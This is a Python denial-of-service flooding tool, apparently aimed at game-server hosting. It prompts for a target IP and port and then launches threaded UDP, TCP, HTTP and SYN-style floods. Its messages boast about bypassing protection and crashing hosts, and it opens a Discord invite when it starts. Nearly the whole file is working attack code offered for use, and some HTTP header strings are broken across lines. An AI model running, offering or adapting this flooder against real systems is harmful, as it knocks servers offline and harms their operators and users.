#AUTHOR SAMP DAMARZ
import random
import socket
import threading
import os
import sys
import time

###### DAMARZ ON TOP! #####
os.system("clear")
os.system("xdg-open https://discord.gg/DAMARZ")
print("\u001B[31m🔥 Welcome to SAMP-DAMARZ World 🔥")
time.sleep(1)
print("\u001B[35mLoading Super Attack...")
os.system("clear")

print("""
\u001B[31m
    ██████╗██╗  ██╗███████╗    ██╗    ██╗███████╗███╗   ███╗███████╗
    ██╔══██╗██║  ██║██╔════╝    ██║    ██║██╔════╝████╗ ████║██╔════╝
    ██████╔╝███████║█████╗      ██║ █╗ ██║█████╗  ██╔████╔██║█████╗  
    ██╔══██╗██╔══██║██╔══╝      ██║███╗██║██╔══╝  ██║╚██╔╝██║██╔══╝  
    ██║  ██║██║  ██║███████╗    ╚███╔███╔╝███████╗██║ ╚═╝ ██║███████╗
    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝     ╚══╝╚══╝ ╚══════╝╚═╝     ╚═╝╚══════╝ V 2.0
\u001B[35m    AUTHOR: SAMP DAMARZ - TEMBUS HOSTING PROTECTION! 💀🔥
""")

ip = str(input("\u001B[31mTarget IP: \u001B[37m"))
port = int(input("\u001B[31mTarget Port: \u001B[37m"))
choice = str(input("\u001B[31mUDP Flood? (y/n): \u001B[37m"))
times = int(input("\u001B[31mPacket Rate: \u001B[37m"))
threads = int(input("\u001B[31mThreads (max 1000): \u001B[37m"))

def attack_udp():
    data = random._urandom(65507)  # Max UDP size
    i = random.choice(("\u001B[31m[*]\u001B[37m","\u001B[32m[!]\u001B[37m","\u001B[35m[#]\u001B[37m"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (ip, port)
            for _ in range(times):
                s.sendto(data, addr)
                s.sendto(data * random.randint(5, 20), addr)  # Multi packet burst
            print(i + " UDP FLOOD SENT - BYPASSING PROTECTION!")
        except:
            pass

def attack_tcp():
    data = random._urandom(1024)
    i = random.choice(("\u001B[31m[*]\u001B[37m","\u001B[32m[!]\u001B[37m","\u001B[35m[#]\u001B[37m"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data * random.randint(10, 50))
            s.send(random._urandom(8192))  # Large chunk
            print(i + " TCP OVERLOAD - HOSTING DOWN!")
        except:
            s.close()
            pass

def attack_http():
    headers = [
        "GET / HTTP/1.1
",
        "Host: " + ip + "
",
        "User-Agent: Mozilla/5.0

"
    ]
    data = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=5000))
    i = random.choice(("\u001B[31m[*]\u001B[37m","\u001B[32m[!]\u001B[37m","\u001B[35m[#]\u001B[37m"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, 80 if port == 80 else port))
            s.send(''.join(headers).encode('utf-8') + data.encode('utf-8'))
            print(i + " HTTP FLOOD - WEB PROTECTION BYPASS!")
        except:
            s.close()
            pass

def attack_syn():
    # Raw SYN flood simulation
    data = random._urandom(1024)
    i = random.choice(("\u001B[31m[*]\u001B[37m","\u001B[32m[!]\u001B[37m","\u001B[35m[#]\u001B[37m"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, port))
            s.send(data)
            print(i + " SYN FLOOD - SERVER CRASHING!")
        except:
            s.close()
            pass

print("\u001B[31m🚀 ATTACK STARTED - DAMARZ MODE ACTIVATED! 🚀")
print("\u001B[35mPress Ctrl+C to stop...
")

for y in range(threads):
    if choice.lower() == 'y':
        th1 = threading.Thread(target=attack_udp)
        th1.start()
        th2 = threading.Thread(target=attack_tcp)
        th2.start()
        th3 = threading.Thread(target=attack_http)
        th3.start()
        th4 = threading.Thread(target=attack_syn)
        th4.start()
    else:
        th = threading.Thread(target=attack_tcp)
        th.start()

print("\u001B[31m💀 SAMP DAMARZ - HOSTING PROTECTION TEMBUS 100%! 💀")
